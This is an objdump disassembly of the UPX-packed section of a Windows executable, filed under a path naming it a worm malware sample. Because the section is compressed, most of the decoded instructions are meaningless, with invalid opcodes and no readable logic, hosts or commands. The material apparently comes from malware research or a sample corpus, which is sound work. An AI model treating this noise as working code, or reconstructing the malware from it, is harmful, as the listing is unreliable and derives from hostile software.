
malware_samples/worm/5f699c825507dc5812a3f21f3a643e87aa76bccf258da7c82535bd44b9e129d5.exe:     file format pei-i386


Disassembly of section UPX1:

00413000 <UPX1>:
  413000:	06                   	push   %es
  413001:	99                   	cltd
  413002:	fb                   	sti
  413003:	ff 04 10             	incl   (%eax,%edx,1)
  413006:	40                   	inc    %eax
  413007:	00 0a                	add    %cl,(%edx)
  413009:	06                   	push   %es
  41300a:	53                   	push   %ebx
  41300b:	74 72                	je     0x41307f
  41300d:	69 6e 67 58 0b 00 d3 	imul   $0xd3000b58,0x67(%esi),%ebp
  413014:	2d 07 fb 1f 04       	sub    $0x41ffb07,%eax
  413019:	0b c0                	or     %eax,%eax
  41301b:	31 cc                	xor    %ecx,%esp
  41301d:	03 d0                	add    %eax,%edx
  41301f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  413020:	59                   	pop    %ecx
  413021:	36 4d                	ss dec %ebp
  413023:	d4 c8                	aam    $0xc8
  413025:	54                   	push   %esp
  413026:	30 70 ac             	xor    %dh,-0x54(%eax)
  413029:	65 c3                	gs ret
  41302b:	ba ff 07 54 4f       	mov    $0x4f5407ff,%edx
  413030:	62 6a 65             	bound  %ebp,0x65(%edx)
  413033:	63 74 64 33          	arpl   %esi,0x33(%esp,%eiz,2)
  413037:	07                   	pop    %es
  413038:	0c 60                	or     $0x60,%al
  41303a:	64 fb                	fs sti
  41303c:	2f                   	das
  41303d:	ff 06                	incl   (%esi)
  41303f:	53                   	push   %ebx
  413040:	79 73                	jns    0x4130b5
  413042:	74 65                	je     0x4130a9
  413044:	6d                   	insl   (%dx),%es:(%edi)
  413045:	ff 25 44 21 41 00    	jmp    *0x412144
  41304b:	8b c0                	mov    %eax,%eax
  41304d:	07                   	pop    %es
  41304e:	40                   	inc    %eax
  41304f:	90                   	nop
  413050:	41                   	inc    %ecx
  413051:	06                   	push   %es
  413052:	19 3c 38             	sbb    %edi,(%eax,%edi,1)
  413055:	34 41                	xor    $0x41,%al
  413057:	06                   	push   %es
  413058:	19 64 30 2c          	sbb    %esp,0x2c(%eax,%esi,1)
  41305c:	28 06                	sub    %al,(%esi)
  41305e:	19 64 90 24          	sbb    %esp,0x24(%eax,%edx,4)
  413062:	20 1c 18             	and    %bl,(%eax,%ebx,1)
  413065:	19 64 90 41          	sbb    %esp,0x41(%eax,%edx,4)
  413069:	54                   	push   %esp
  41306a:	14 50                	adc    $0x50,%al
  41306c:	64 90                	fs nop
  41306e:	41                   	inc    %ecx
  41306f:	06                   	push   %es
  413070:	10 0c 08             	adc    %cl,(%eax,%ecx,1)
  413073:	c9                   	leave
  413074:	41                   	inc    %ecx
  413075:	06                   	push   %es
  413076:	19 04 00             	sbb    %eax,(%eax,%eax,1)
  413079:	fc                   	cld
  41307a:	20 06                	and    %al,(%esi)
  41307c:	39 39                	cmp    %edi,(%ecx)
  41307e:	c8 f8 64 21          	enter  $0x64f8,$0x21
  413082:	60                   	pusha
  413083:	5c                   	pop    %esp
  413084:	72 72                	jb     0x4130f8
  413086:	90                   	nop
  413087:	41                   	inc    %ecx
  413088:	6c                   	insb   (%dx),%es:(%edi)
  413089:	f4                   	hlt
  41308a:	20 f0                	and    %dh,%al
  41308c:	f8                   	clc
  41308d:	23 83 0c ec e8 53    	and    0x53e8ec0c(%ebx),%eax
  413093:	83 c4 bc             	add    $0xffffffbc,%esp
  413096:	bb 0a ed ff bf       	mov    $0xbfffed0a,%ebx
  41309b:	6d                   	insl   (%dx),%es:(%edi)
  41309c:	01 54 e8 03          	add    %edx,0x3(%eax,%ebp,8)
  4130a0:	01 1c f6             	add    %ebx,(%esi,%esi,8)
  4130a3:	44                   	inc    %esp
  4130a4:	24 2c                	and    $0x2c,%al
  4130a6:	01 74 05 0f          	add    %esi,0xf(%ebp,%eax,1)
  4130aa:	b7 5c                	mov    $0x5c,%bh
  4130ac:	24 30                	and    $0x30,%al
  4130ae:	8b c3                	mov    %ebx,%eax
  4130b0:	1b f2                	sbb    %edx,%esi
  4130b2:	e4 c9                	in     $0xc9,%al
  4130b4:	ef                   	out    %eax,(%dx)
  4130b5:	44                   	inc    %esp
  4130b6:	5b                   	pop    %ebx
  4130b7:	c3                   	ret
  4130b8:	63 e4                	arpl   %esp,%esp
  4130ba:	20 e0                	and    %ah,%al
  4130bc:	20 dc                	and    %bl,%ah
  4130be:	20 41 06             	and    %al,0x6(%ecx)
  4130c1:	39 79 d8             	cmp    %edi,-0x28(%ecx)
  4130c4:	20 d4                	and    %dl,%ah
  4130c6:	d0 2f                	shrb   $1,(%edi)
  4130c8:	fc                   	cld
  4130c9:	64 90                	fs nop
  4130cb:	cc                   	int3
  4130cc:	c8 56 be d4          	enter  $0xbe56,$0xd4
  4130d0:	c5 69 83             	lds    -0x7d(%ecx),%ebp
  4130d3:	3e 00 ed             	ds add %ch,%ch
  4130d6:	ff 73 fb             	push   -0x5(%ebx)
  4130d9:	75 3a                	jne    0x413115
  4130db:	68 44 06 6c 6a       	push   $0x6a6c0644
  4130e0:	00 90 8b c8 85 c9    	add    %dl,-0x367a3775(%eax)
  4130e6:	75 05                	jne    0x4130ed
  4130e8:	33 c0                	xor    %eax,%eax
  4130ea:	5e                   	pop    %esi
  4130eb:	64 ff                	fs (bad)
  4130ed:	ff                   	ljmp   (bad)
  4130ee:	ef                   	out    %eax,(%dx)
  4130ef:	dd a1 d0 20 89 01    	frstor 0x18920d0(%ecx)
  4130f5:	89 0d 07 33 d2 8b    	mov    %ecx,0x8bd23307
  4130fb:	c2 03 c0             	ret    $0xc003
  4130fe:	8d 44 c1 04          	lea    0x4(%ecx,%eax,8),%eax
  413102:	8b 1e                	mov    (%esi),%ebx
  413104:	89 18                	mov    %ebx,(%eax)
  413106:	89 06                	mov    %eax,(%esi)
  413108:	ef                   	out    %eax,(%dx)
  413109:	6d                   	insl   (%dx),%es:(%edi)
  41310a:	f7 ff                	idiv   %edi
  41310c:	42                   	inc    %edx
  41310d:	83 fa 64             	cmp    $0x64,%edx
  413110:	75 ec                	jne    0x4130fe
  413112:	8b 06                	mov    (%esi),%eax
  413114:	8b 10                	mov    (%eax),%edx
  413116:	89 16                	mov    %edx,(%esi)
  413118:	2b 90 89 29 40 04    	sub    0x4402989(%eax),%edx
  41311e:	c3                   	ret
  41311f:	57                   	push   %edi
  413120:	fb                   	sti
  413121:	0f f6 f7             	psadbw %mm7,%mm6
  413124:	8b f2                	mov    %edx,%esi
  413126:	8b d8                	mov    %eax,%ebx
  413128:	4a                   	dec    %edx
  413129:	d0 85 c0 48 8b 16    	rolb   $1,0x168b48c0(%ebp)
  41312f:	89 50 08             	mov    %edx,0x8(%eax)
  413132:	8b 56 04             	mov    0x4(%esi),%edx
  413135:	05 df db b6 7d       	add    $0x7db6dbdf,%eax
  41313a:	0c 8b                	or     $0x8b,%al
  41313c:	13 89 30 58 09 42    	adc    0x42095830(%ecx),%ecx
  413142:	02 03                	add    (%ebx),%al
  413144:	b0 01                	mov    $0x1,%al
  413146:	1b 50 6f             	sbb    0x6f(%eax),%edx
  413149:	7b db                	jnp    0x413126
  41314b:	6f                   	outsl  %ds:(%esi),(%dx)
  41314c:	50                   	push   %eax
  41314d:	08 89 0a 89 51 06    	or     %cl,0x651890a(%ecx)
  413153:	15 90 1e a3 06       	adc    $0x6a31e90,%eax
  413158:	bd db ff b7 c3       	mov    $0xc3b7ffdb,%ebp
  41315d:	47                   	inc    %edi
  41315e:	57                   	push   %edi
  41315f:	55                   	push   %ebp
  413160:	51                   	push   %ecx
  413161:	8b f1                	mov    %ecx,%esi
  413163:	89 14 24             	mov    %edx,(%esp)
  413166:	8b e8                	mov    %eax,%ebp
  413168:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  41316b:	04 24                	add    $0x24,%al
  41316d:	69 85 ff ee d6 2d 89 	imul   $0x3b8b4789,0x2dd6eeff(%ebp),%eax
  413174:	47 8b 3b 
  413177:	77 53                	ja     0x4131cc
  413179:	08 03                	or     %al,(%ebx)
  41317b:	53                   	push   %ebx
  41317c:	0c 3b                	or     $0x3b,%al
  41317e:	c2 75 14             	ret    $0x1475
  413181:	12 e5                	adc    %ch,%ah
  413183:	df b6 77 6d 02 58    	fbstp  0x58026d77(%esi)
  413189:	8b 43 46             	mov    0x46(%ebx),%eax
  41318c:	06                   	push   %es
  41318d:	04 0c                	add    $0xc,%al
  41318f:	01 46 04             	add    %eax,0x4(%esi)
  413192:	eb 15                	jmp    0x4131a9
  413194:	03 ed                	add    %ebp,%ebp
  413196:	bf 64 b7 3b 0f       	mov    $0xf3bb764,%edi
  41319b:	75 0d                	jne    0x4131aa
  41319d:	1b 16                	sbb    (%esi),%edx
  41319f:	8b df                	mov    %edi,%ebx
  4131a1:	3b eb                	cmp    %ebx,%ebp
  4131a3:	75 70                	jne    0x413215
  4131a5:	7b 2b                	jnp    0x4131d2
  4131a7:	db ef                	fucomi %st(7),%st
  4131a9:	d6                   	salc
  4131aa:	8b c5                	mov    %ebp,%eax
  4131ac:	14 28                	adc    $0x28,%al
  4131ae:	84 9e 04 33 5a 5d    	test   %bl,0x5d5a3304(%esi)
  4131b4:	5f                   	pop    %edi
  4131b5:	87 77 df             	xchg   %esi,-0x21(%edi)
  4131b8:	16                   	push   %ss
  4131b9:	9e                   	sahf
  4131ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4131bb:	5a                   	pop    %edx
  4131bc:	f8                   	clc
  4131bd:	ba 8b fb 8b 32       	mov    $0x328bfb8b,%edx
  4131c2:	4b                   	dec    %ebx
  4131c3:	3b f0                	cmp    %eax,%esi
  4131c5:	72 7b                	jb     0x413242
  4131c7:	7b 7b                	jnp    0x413244
  4131c9:	fb                   	sti
  4131ca:	70 8b                	jo     0x413157
  4131cc:	ce                   	into
  4131cd:	03 4a 35             	add    0x35(%edx),%ecx
  4131d0:	e8 03 6b 67 cd       	call   0xcda89cd8
  4131d5:	77 62                	ja     0x413239
  4131d7:	11 75 1b             	adc    %esi,0x1b(%ebp)
  4131da:	8b b7 2d bc 75 6d    	mov    0x6d75bc2d(%edi),%esi
  4131e0:	01 1b                	add    %ebx,(%ebx)
  4131e2:	05 29 51 83 7b       	add    $0x7b835129,%eax
  4131e7:	0c 3b                	or     $0x3b,%al
  4131e9:	48                   	dec    %eax
  4131ea:	16                   	push   %ss
  4131eb:	ec                   	in     (%dx),%al
  4131ec:	b7 83                	mov    $0x83,%bh
  4131ee:	61                   	popa
  4131ef:	eb 3f                	jmp    0x413230
  4131f1:	2c 8b                	sub    $0x8b,%al
  4131f3:	7a 04                	jp     0x4131f9
  4131f5:	03 cf                	add    %edi,%ecx
  4131f7:	2e f9                	cs stc
  4131f9:	6b db ee             	imul   $0xffffffee,%ebx,%ebx
  4131fc:	db 29                	fldt   (%ecx)
  4131fe:	1e                   	push   %ds
  4131ff:	eb 2a                	jmp    0x41322b
  413201:	8b 0a                	mov    (%edx),%ecx
  413203:	41                   	inc    %ecx
  413204:	89 0c bb             	mov    %ecx,(%ebx,%edi,4)
  413207:	7b ad                	jnp    0x4131b6
  413209:	0f b2 b7 f0 7f 2b f9 	lss    -0x6d48010(%edi),%esi
  413210:	89 7c 24 04          	mov    %edi,0x4(%esp)
  413214:	2b f0                	sub    %eax,%esi
  413216:	89 73 07             	mov    %esi,0x7(%ebx)
  413219:	d4 38                	aam    $0x38
  41321b:	85 b6 fd b6 70 eb    	test   %esi,-0x148f4903(%esi)
  413221:	0c 0c                	or     $0xc,%al
  413223:	eb 57                	jmp    0x41327c
  413225:	1b 3b                	sbb    (%ebx),%edi
  413227:	fb                   	sti
  413228:	75 81                	jne    0x4131ab
  41322a:	0d 59 92 bd df       	or     $0xdfbd9259,%eax
  41322f:	7e 77                	jle    0x4132a8
  413231:	90                   	nop
  413232:	93                   	xchg   %eax,%ebx
  413233:	8b da                	mov    %edx,%ebx
  413235:	8b f0                	mov    %eax,%esi
  413237:	81 fe 28 10 00 7d    	cmp    $0x7d001028,%esi
  41323d:	07                   	pop    %es
  41323e:	be 06 bf 35 dd       	mov    $0xdd35bf06,%esi
  413243:	be 29 81 c6 ff       	mov    $0xffc68129,%esi
  413248:	ff 09                	decl   (%ecx)
  41324a:	81 e6 17 ff 49 04    	and    $0x449ff17,%esi
  413250:	6a 01                	push   $0x1
  413252:	68 00 f8 ff 13       	push   $0x13fff800
  413257:	96                   	xchg   %eax,%esi
  413258:	20 56 bf             	and    %dl,-0x41(%esi)
  41325b:	a0 8b f8 89 3b       	mov    0x3b89f88b,%al
  413260:	85 ff                	test   %edi,%edi
  413262:	74 23                	je     0x413287
  413264:	8b d3                	mov    %ebx,%edx
  413266:	b8 d8 fd b0 1d       	mov    $0x1db0fdd8,%eax
  41326b:	66 47                	inc    %di
  41326d:	63 13                	arpl   %edx,(%ebx)
  41326f:	24 80                	and    $0x80,%al
  413271:	e3 8b                	jecxz  0x4131fe
  413273:	03 50 37             	add    0x37(%eax),%edx
  413276:	7c 58                	jl     0x4132d0
  413278:	f7 26                	mull   (%esi)
  41327a:	a8 f8                	test   $0xf8,%al
  41327c:	03 63 55             	add    0x55(%ebx),%esp
  41327f:	8b d9                	mov    %ecx,%ebx
  413281:	b3 e8                	mov    $0xe8,%bl
  413283:	c7 43 80 7d 63 bf 04 	movl   $0x4bf637d,-0x80(%ebx)
  41328a:	60                   	pusha
  41328b:	6a 04                	push   $0x4
  41328d:	4f                   	dec    %edi
  41328e:	68 0b 55 52 9b       	push   $0x9b52550b
  413293:	4d                   	dec    %ebp
  413294:	8e ec                	mov    %esp,%gs
  413296:	75 1f                	jne    0x4132b7
  413298:	78 04                	js     0x41329e
  41329a:	24 4e                	and    $0x4e,%al
  41329c:	48                   	dec    %eax
  41329d:	96                   	xchg   %eax,%esi
  41329e:	00 7b 83             	add    %bh,-0x7d(%ebx)
  4132a1:	3b 00                	cmp    (%eax),%eax
  4132a3:	76 db                	jbe    0x413280
  4132a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4132a6:	34 14                	xor    $0x14,%al
  4132a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4132a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4132aa:	ec                   	in     (%dx),%al
  4132ab:	89 4c 10 e3          	mov    %ecx,-0x1d(%eax,%edx,1)
  4132af:	c7                   	(bad)
  4132b0:	e2 08                	loop   0x4132ba
  4132b2:	ff                   	lcall  (bad)
  4132b3:	dd d0                	fst    %st(0)
  4132b5:	be e1 00 65 89       	mov    $0x896500e1,%esi
  4132ba:	54                   	push   %esp
  4132bb:	24 0c                	and    $0xc,%al
  4132bd:	8b ee                	mov    %esi,%ebp
  4132bf:	03 c5                	add    %ebp,%eax
  4132c1:	89 5f 68             	mov    %ebx,0x68(%edi)
  4132c4:	f8                   	clc
  4132c5:	bd 14 10 8b 1d       	mov    $0x1d8b1014,%ebp
  4132ca:	4e                   	dec    %esi
  4132cb:	eb 51                	jmp    0x41331e
  4132cd:	f2 73 93             	bnd jae 0x413263
  4132d0:	ee                   	out    %al,(%dx)
  4132d1:	77 46                	ja     0x413319
  4132d3:	8b 6d ed             	mov    -0x13(%ebp),%ebp
  4132d6:	dd c2                	ffree  %st(2)
  4132d8:	c6 03 7a             	movb   $0x7a,(%ebx)
  4132db:	3b 19                	cmp    (%ecx),%ebx
  4132dd:	77 3b                	ja     0x41331a
  4132df:	3b 74 34 86          	cmp    -0x7a(%esp,%esi,1),%esi
  4132e3:	89 60 ae             	mov    %esp,-0x52(%eax)
  4132e6:	3d cc 05 14 0c       	cmp    $0xc1405cc,%eax
  4132eb:	76 0e                	jbe    0x4132fb
  4132ed:	05 74 a6 ee cd       	add    $0xcdeea674,%eax
  4132f2:	c7                   	(bad)
  4132f3:	56                   	push   %esi
  4132f4:	85 a8 0a c7 05 b4    	test   %ebp,-0x4bfa38f6(%eax)
  4132fa:	45                   	inc    %ebp
  4132fb:	01 51 b7             	add    %edx,-0x49(%ecx)
  4132fe:	fd                   	std
  4132ff:	7d 18                	jge    0x413319
  413301:	10 df                	adc    %bl,%bh
  413303:	81 fb 58 75 a7 8b    	cmp    $0x8ba77558,%ebx
  413309:	2f                   	das
  41330a:	04 75                	add    $0x75,%al
  41330c:	46                   	inc    %esi
  41330d:	fb                   	sti
  41330e:	b6 76                	mov    $0x76,%dh
  413310:	10 83 7c 37 bf 19    	adc    %al,0x19bf377c(%ebx)
  413316:	0e                   	push   %cs
  413317:	8b 82 4a 7b 38 d7    	mov    -0x28c784b6(%edx),%eax
  41331d:	b5 79                	mov    $0x79,%ch
  41331f:	48                   	dec    %eax
  413320:	2b 96 0d ae ab 7f    	sub    0x7fabae0d(%esi),%edx
  413326:	b0 01                	mov    $0x1,%al
  413328:	63 14 27             	arpl   %edx,(%edi,%eiz,1)
  41332b:	f4                   	hlt
  41332c:	b7 8b                	mov    $0x8b,%bh
  41332e:	d0 8b ea 81 e5 bd    	rorb   $1,-0x421a7e16(%ebx)
  413334:	86 6f db             	xchg   %ch,-0x25(%edi)
  413337:	00 f0                	add    %dh,%al
  413339:	b9 03 0c 81 c2       	mov    $0xc2810c03,%ecx
  41333e:	ff 0f                	decl   (%edi)
  413340:	1f                   	pop    %ds
  413341:	e2 0e                	loop   0x413351
  413343:	c1 ee 9a             	shr    $0x9a,%esi
  413346:	cd c6                	int    $0xc6
  413348:	39 44 28 05          	cmp    %eax,0x5(%eax,%ebp,1)
  41334c:	08 2b                	or     %ch,(%ebx)
  41334e:	c5 45 df             	lds    -0x21(%ebp),%eax
  413351:	f8                   	clc
  413352:	f6 d8                	neg    %al
  413354:	8b 35 ce 3c 8b 5e    	mov    0x5e8b3cce,%esi
  41335a:	1d 7e 0c 03 fb       	sbb    $0xfb030c7e,%eax
  41335f:	90                   	nop
  413360:	76 02                	jbe    0x413364
  413362:	8b dd                	mov    %ebp,%ebx
  413364:	e1 82                	loope  0x4132e8
  413366:	db b6 3b 7b 08 b9    	(bad) -0x46f784c5(%esi)
  41336c:	8b 05 ff 76 1e 57    	mov    0x571e76ff,%eax
  413372:	c3                   	ret
  413373:	ce                   	into
  413374:	f7 e5                	mul    %ebp
  413376:	10 2b                	adc    %ch,(%ebx)
  413378:	fb                   	sti
  413379:	57                   	push   %edi
  41337a:	53                   	push   %ebx
  41337b:	c0 a0 a5 b3 8d 35 b6 	shlb   $0xb6,0x358db3a5(%eax)
  413382:	eb 09                	jmp    0x41338d
  413384:	36 0e                	ss push %cs
  413386:	b9 bc 91 0c 19       	mov    $0x190c91bc,%ecx
  41338b:	3a 4e a7             	cmp    -0x59(%esi),%cl
  41338e:	73 2b                	jae    0x4133bb
  413390:	b9 f3 a1 10 e4       	mov    $0xe410a1f3,%ecx
  413395:	36 f2 81 e6 34 9d eb 	ss repnz and $0x3eb9d34,%esi
  41339c:	03 
  41339d:	61                   	popa
  41339e:	dd 46 c9             	fldl   -0x37(%esi)
  4133a1:	4f                   	dec    %edi
  4133a2:	c8 f7 2b 06          	enter  $0x2bf7,$0x6
  4133a6:	41                   	inc    %ecx
  4133a7:	84 6d 6f             	test   %ch,0x6f(%ebp)
  4133aa:	3f                   	aas
  4133ab:	c9                   	leave
  4133ac:	38 1c 24             	cmp    %bl,(%esp)
  4133af:	73 03                	jae    0x4133b4
  4133b1:	8b 04 3b             	mov    (%ebx,%edi,1),%eax
  4133b4:	ef                   	out    %eax,(%dx)
  4133b5:	73 8c                	jae    0x413343
  4133b7:	fd                   	std
  4133b8:	86 84 c9 d6 82 1c 80 	xchg   %al,-0x7fe37d2a(%ecx,%ecx,8)
  4133bf:	40                   	inc    %eax
  4133c0:	41                   	inc    %ecx
  4133c1:	02 6a 67             	add    0x67(%edx),%ch
  4133c4:	1c 76                	sbb    $0x76,%al
  4133c6:	80 c0 a5             	add    $0xa5,%al
  4133c9:	8d 0a                	lea    (%edx),%ecx
  4133cb:	ee                   	out    %al,(%dx)
  4133cc:	dd 1b                	fstpl  (%ebx)
  4133ce:	43                   	inc    %ebx
  4133cf:	3b 44 f8 bd          	cmp    -0x43(%eax,%edi,8),%eax
  4133d3:	e8 1a 81 c7 ff       	call   0x8b4f2
  4133d8:	3f                   	aas
  4133d9:	86 37                	xchg   %dh,(%edi)
  4133db:	6e                   	outsb  %ds:(%esi),(%dx)
  4133dc:	5d                   	pop    %ebp
  4133dd:	83 e7 00             	and    $0x0,%edi
  4133e0:	79 5d                	jns    0x41343f
  4133e2:	69 33 3b fb 7f 2c    	imul   $0x2c7ffb3b,(%ebx),%esi
  4133e8:	77 ed                	ja     0x4133d7
  4133ea:	4c                   	dec    %esp
  4133eb:	4d                   	dec    %ebp
  4133ec:	20 d7                	and    %dl,%bh
  4133ee:	58                   	pop    %eax
  4133ef:	52                   	push   %edx
  4133f0:	05 08 76 74 50       	add    $0x50747608,%eax
  4133f5:	8b 0e                	mov    (%esi),%ecx
  4133f7:	99                   	cltd
  4133f8:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  4133fa:	46                   	inc    %esi
  4133fb:	4c                   	dec    %esp
  4133fc:	46                   	inc    %esi
  4133fd:	3e 35 3f bb a6 9b    	ds xor $0x9ba6bb3f,%eax
  413403:	09 dd                	or     %ebx,%ebp
  413405:	75 c9                	jne    0x4133d0
  413407:	aa                   	stos   %al,%es:(%edi)
  413408:	c7                   	(bad)
  413409:	2e 03 74 21 8b       	add    %cs:-0x75(%ecx,%eiz,1),%esi
  41340e:	cc                   	int3
  41340f:	97                   	xchg   %eax,%edi
  413410:	db 7e 48             	fstpt  0x48(%esi)
  413413:	ba 70 83 3c 24       	mov    $0x243c8370,%edx
  413418:	2d a5 10 0b 84       	sub    $0x840b10a5,%eax
  41341d:	49                   	dec    %ecx
  41341e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41341f:	5d                   	pop    %ebp
  413420:	06                   	push   %es
  413421:	11 04 50             	adc    %eax,(%eax,%edx,2)
  413424:	c8 36 0f 60          	enter  $0xf36,$0x60
  413428:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  413429:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41342a:	c7                   	(bad)
  41342b:	5b                   	pop    %ebx
  41342c:	77 fa                	ja     0x413428
  41342e:	3e 92                	ds xchg %eax,%edx
  413430:	dd 58 e0             	fstpl  -0x20(%eax)
  413433:	4d                   	dec    %ebp
  413434:	02 61 53             	add    0x53(%ecx),%ah
  413437:	3b 54 75 f5          	cmp    -0xb(%ebp,%esi,2),%edx
  41343b:	36 43                	ss inc %ebx
  41343d:	77 f7                	ja     0x413436
  41343f:	04 57                	add    $0x57,%al
  413441:	a2 0f 8e 96 df       	mov    %al,0xdf968e0f
  413446:	8d                   	lea    (bad),%ebx
  413447:	d9 a8 2b 1d 9f c3    	fldcw  -0x3c60e2d5(%eax)
  41344d:	b5 5b                	mov    $0x5b,%ch
  41344f:	ab                   	stos   %eax,%es:(%edi)
  413450:	55                   	push   %ebp
  413451:	7f d8                	jg     0x41342b
  413453:	1c 04                	sbb    $0x4,%al
  413455:	18 66 d8             	sbb    %ah,-0x28(%esi)
  413458:	2d 33 1a 0c 8d       	sub    $0x8d0c1a33,%eax
  41345d:	c8 85 c4 82          	enter  $0xc485,$0x82
  413461:	f0 fd                	lock std
  413463:	32 75 b1             	xor    -0x4f(%ebp),%dh
  413466:	15 8b ee 8b 63       	adc    $0x638bee8b,%eax
  41346b:	76 7b                	jbe    0x4134e8
  41346d:	30 6c ab e9          	xor    %ch,-0x17(%ebx,%ebp,4)
  413471:	0b 07                	or     (%edi),%eax
  413473:	c7                   	(bad)
  413474:	4d                   	dec    %ebp
  413475:	9f                   	lahf
  413476:	7c 80                	jl     0x4133f8
  413478:	0c 58                	or     $0x58,%al
  41347a:	46                   	inc    %esi
  41347b:	34 0f                	xor    $0xf,%al
  41347d:	85 66 63             	test   %esp,0x63(%esi)
  413480:	eb 08                	jmp    0x41348a
  413482:	73 fe                	jae    0x413482
  413484:	4a                   	dec    %edx
  413485:	eb 66                	jmp    0x4134ed
  413487:	6b 1b 5d             	imul   $0x5d,(%ebx),%ebx
  41348a:	e1 50                	loope  0x4134dc
  41348c:	60                   	pusha
  41348d:	f5                   	cmc
  41348e:	a9 48 1c d7 d7       	test   $0xd7d71c48,%eax
  413493:	81 6d 67 78 3c 48 20 	subl   $0x20483c78,0x67(%ebp)
  41349a:	83 38 53             	cmpl   $0x53,(%eax)
  41349d:	28 1f                	sub    %bl,(%edi)
  41349f:	99                   	cltd
  4134a0:	84 17                	test   %dl,(%edi)
  4134a2:	e1 40                	loope  0x4134e4
  4134a4:	4e                   	dec    %esi
  4134a5:	08 51 10             	or     %dl,0x10(%ecx)
  4134a8:	69 18 c1 0e 07 49    	imul   $0x49070ec1,(%eax),%ebx
  4134ae:	c6                   	(bad)
  4134af:	7f 8c                	jg     0x41343d
  4134b1:	b0 63                	mov    $0x63,%al
  4134b3:	c3                   	ret
  4134b4:	22 8b f9 c4 8d 98    	and    -0x67723b07(%ebx),%cl
  4134ba:	1b e3                	sbb    %ebx,%esp
  4134bc:	fe                   	(bad)
  4134bd:	db da                	fcmovnu %st(2),%st
  4134bf:	88 35 03 70 e6 0a    	mov    %dh,0xae67003
  4134c5:	3b de                	cmp    %esi,%ebx
  4134c7:	73 5b                	jae    0x413524
  4134c9:	8b c3                	mov    %ebx,%eax
  4134cb:	d9 b1 b7 cf d6 2b    	fnstenv 0x2bd6cfb7(%ecx)
  4134d1:	d3 44 05 9c          	roll   %cl,-0x64(%ebp,%eax,1)
  4134d5:	cb                   	lret
  4134d6:	b8 4e 9b ec db       	mov    $0xdbec9b4e,%eax
  4134db:	b1 b8                	mov    $0xb8,%cl
  4134dd:	8b 5c 0f 85          	mov    -0x7b(%edi,%ecx,1),%ebx
  4134e1:	db 74 1f b5          	(bad) -0x4b(%edi,%ebx,1)
  4134e5:	c3                   	ret
  4134e6:	b3 6b                	mov    $0x6b,%bl
  4134e8:	3a d7                	cmp    %bh,%dl
  4134ea:	34 38                	xor    $0x38,%al
  4134ec:	89 c0                	mov    %eax,%eax
  4134ee:	07                   	pop    %es
  4134ef:	10 08                	adc    %cl,(%eax)
  4134f1:	f5                   	cmc
  4134f2:	1e                   	push   %ds
  4134f3:	38 d9                	cmp    %bl,%cl
  4134f5:	3b 14 f1             	cmp    (%ecx,%esi,8),%edx
  4134f8:	3b e0                	cmp    %eax,%esp
  4134fa:	eb 7a                	jmp    0x413576
  4134fc:	07                   	pop    %es
  4134fd:	db b7 ad e7 8d 8c    	(bad) -0x73721853(%edi)
  413503:	80 ec 9b             	sub    $0x9b,%ah
  413506:	55                   	push   %ebp
  413507:	68 16 19 1c 64       	push   $0x641c1916
  41350c:	db f1                	fcomi  %st(1),%st
  41350e:	cf                   	iret
  41350f:	fe                   	(bad)
  413510:	ff 32                	push   (%edx)
  413512:	64 89 22             	mov    %esp,%fs:(%edx)
  413515:	68 b8 27 01 b0       	push   $0xb00127b8
  41351a:	80 3d 39 c0 8b 74 0a 	cmpb   $0xa,0x748bc039
  413521:	12 96 6c b2 26 b8    	adc    -0x47d94d94(%esi),%dl
  413527:	60                   	pusha
  413528:	20 4e 09             	and    %cl,0x9(%esi)
  41352b:	9d                   	popf
  41352c:	0c 1e                	or     $0x1e,%al
  41352e:	e4 14                	in     $0x14,%al
  413530:	c6                   	(bad)
  413531:	68 f8 0f cb a3       	push   $0xa3cb0ff8
  413536:	10 df                	adc    %bl,%bh
  413538:	c7                   	(bad)
  413539:	db db                	fcmovnu %st(3),%st
  41353b:	15 83 3d 05 41       	adc    $0x41053d83,%eax
  413540:	2f                   	das
  413541:	b8 03 bd 15 0d       	mov    $0xd15bd03,%eax
  413546:	33 6e e0             	xor    -0x20(%esi),%ebp
  413549:	fa                   	cli
  41354a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41354b:	c9                   	leave
  41354c:	bf 82 f4 40 3d       	mov    $0x3d40f482,%edi
  413551:	01 f1                	add    %esi,%ecx
  413553:	c4 b8 f8 77 37 70    	les    0x703777f8(%eax),%edi
  413559:	e0 46                	loopne 0x4135a1
  41355b:	bd c2 a3 04 1c       	mov    $0x1c04a3c2,%ebp
  413560:	c6 05 b0 e6 de de 5e 	movb   $0x5e,0xdedee6b0
  413567:	2c 9f                	sub    $0x9f,%al
  413569:	5a                   	pop    %edx
  41356a:	59                   	pop    %ecx
  41356b:	59                   	pop    %ecx
  41356c:	8b 10                	mov    (%eax),%edx
  41356e:	68 1d 96 86 ef       	push   $0xef86961d
  413573:	fb                   	sti
  413574:	86 57 c0             	xchg   %dl,-0x40(%edi)
  413577:	c3                   	ret
  413578:	df 24 8c             	fbld   (%esp,%ecx,4)
  41357b:	eb e5                	jmp    0x413562
  41357d:	a0 2d 5d c3 3e       	mov    0x3ec35d2d,%al
  413582:	77 e1                	ja     0x413565
  413584:	b5 53                	mov    $0x53,%ch
  413586:	25 0b cb 84 cc       	and    $0xcc84cb0b,%eax
  41358b:	69 d1 fa 3d 0b 60    	imul   $0x600b3dfa,%ecx,%edx
  413591:	49                   	dec    %ecx
  413592:	c7                   	(bad)
  413593:	67 00 a1 2b 56       	add    %ah,0x562b(%bx,%di)
  413598:	46                   	inc    %esi
  413599:	e0 90                	loopne 0x41352b
  41359b:	1d 98 b1 f3 01       	sbb    $0x1f3b198,%eax
  4135a0:	47                   	inc    %edi
  4135a1:	b0 06                	mov    $0x6,%al
  4135a3:	12 c6                	adc    %dh,%al
  4135a5:	87 3c 12             	xchg   %edi,(%edx,%edx,1)
  4135a8:	06                   	push   %es
  4135a9:	ab                   	stos   %eax,%es:(%edi)
  4135aa:	31 b2 b4 e6 02 c4    	xor    %esi,-0x3bfd194c(%edx)
  4135b0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4135b1:	48                   	dec    %eax
